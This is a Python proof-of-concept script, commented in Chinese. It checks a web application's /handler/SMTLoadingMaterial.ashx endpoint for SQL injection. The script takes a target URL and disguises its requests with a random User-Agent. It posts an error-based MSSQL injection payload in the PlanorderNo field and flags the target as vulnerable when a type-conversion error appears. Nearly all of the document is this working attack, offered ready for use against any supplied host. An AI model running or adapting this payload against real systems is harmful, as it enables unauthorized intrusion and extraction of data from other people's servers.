import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的POST请求。存在问题的路径为/handler/SMTLoadingMaterial.ashx',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/handler/SMTLoadingMaterial.ashx"  # 移除末尾的斜杠
    else:
        url = args.url + "/handler/SMTLoadingMaterial.ashx"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': fake.user_agent(),
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept-Encoding': 'gzip'
}
data = {
    'type': 'GetorderList',
    'PlanorderNo': "1' AND 9304 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(113)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (9304=9304) THEN CHAR(49) ELSE CHAR(48) END)))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(120)+CHAR(113))--"
}

response = requests.post(url, headers=headers,data=data)
if "转换成数据类型" in response.text:
    print("目标url："+ url + '\n' +"可能存在该漏洞"+ '/n'+ '返回内容为' + response.text)
else:
    print("目标url："+ url + '\n' +"不存在该漏洞")